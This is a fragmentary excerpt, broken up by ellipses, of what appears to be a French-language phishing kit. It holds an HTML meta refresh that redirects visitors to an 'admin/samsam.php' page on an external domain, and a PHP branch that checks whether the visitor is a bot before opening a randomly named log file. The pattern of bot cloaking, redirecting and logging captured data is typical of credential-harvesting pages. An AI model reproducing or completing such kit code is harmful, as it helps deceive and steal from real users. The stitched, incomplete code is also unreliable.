...
<!DOCTYPE html>
<html lang="fr">
<meta http-equiv="refresh" content="4; URL=https://www.mewalauba.tech/admin/samsam.php" />
...
if ($isBot) {
	...
	$file = fopen("U92Zb3ALSChwx4rLDa4DT5238i7i7ja.php", "r") or exit("boutafara d'ouvrir les logs !");
